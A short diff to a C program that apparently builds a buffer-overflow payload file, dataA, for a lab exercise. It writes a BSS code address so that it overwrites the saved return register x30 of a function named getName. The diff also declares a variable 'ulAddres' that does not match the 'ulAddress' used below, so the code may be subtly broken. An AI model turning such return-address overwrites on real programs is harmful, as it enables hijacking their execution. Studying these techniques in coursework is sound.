@@ -17,6 +17,7 @@
 int main(void) {
     FILE *psFile;
     unsigned int ulInstruction;
+    unsigned long ulAddres;
     int i = 0;
 
     /* Open file dataA to write data into */
@@ -56,7 +57,7 @@ int main(void) {
     }
 
     /* Write the unsigned long address (0x420064) of the mov
-     * instruction in BSS to file dataA */
+     * instruction in BSS to file dataA, overwriting getName's x30 */
     ulAddress = 0x420064;
     fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
 
